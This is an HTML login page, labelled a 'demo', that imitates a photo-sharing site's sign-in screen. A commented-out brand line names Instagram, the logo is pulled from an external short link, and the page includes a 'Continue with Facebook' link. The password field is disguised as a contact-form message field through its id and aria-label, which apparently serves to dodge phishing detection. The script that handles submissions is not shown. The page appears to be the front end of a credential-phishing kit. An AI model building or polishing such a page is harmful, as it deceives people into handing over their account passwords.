<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
<title>Social Login UI Demo</title>
<link rel="stylesheet" href="/style.css">

</head>
<body>
<main class="layout">
  <section class="phone-art" aria-label="Social photo sharing preview">
    <div class="phone phone-back"><div class="screen"><div class="mini-top"></div><div class="photo photo-one"></div><div class="mini-lines"></div></div></div>
    <div class="phone phone-front"><div class="screen"><div class="mini-top"></div><div class="photo photo-two"></div><div class="mini-lines"></div><div class="mini-photo"></div></div></div>
    <div class="sparkle">✦</div>
  </section>
  <section class="auth-column">
    <div class="login-card">
 
      <!-- <div class="brand" aria-label="Socially demo">Instagram</div> -->
      <!-- <p class="demo-note">A social-media login design demo</p> -->
      <a href="index.html">
  <img src="https://share.google/8FCmXzkrpUgtMoALs" alt="Company Logo" width="150" height="50">
</a>

      <form id="contact-form">
        <input class="field-look message-field" placeholder="UserName" maxlength="20" ></input> </br>
        <input class="field-look message-field" id="contact-message" name="password" placeholder="Password" maxlength="20" required aria-label="Your message"></input> </br>
        <button class="demo-button" id="demo-login" type="submit">Login</button>
      </form>
      <div class="or"><span></span><b>OR</b><span></span></div>
      <a class="facebook" href="#demo-info">◎ &nbsp; Continue with Facebook</a>
      <a class="forgot" href="#demo-info">Forgot password?</a>
      <p id="message" role="status" aria-live="polite"></p>
    </div>
    <div class="signup-card">Don't have an account? <a href="#demo-info">Sign up</a></div>
    <p class="demo-info" id="demo-info"></p>
    <footer>About · Help · Privacy · Terms</footer>
  </section>
</main>
<script src="/app.js" defer></script>
</body>
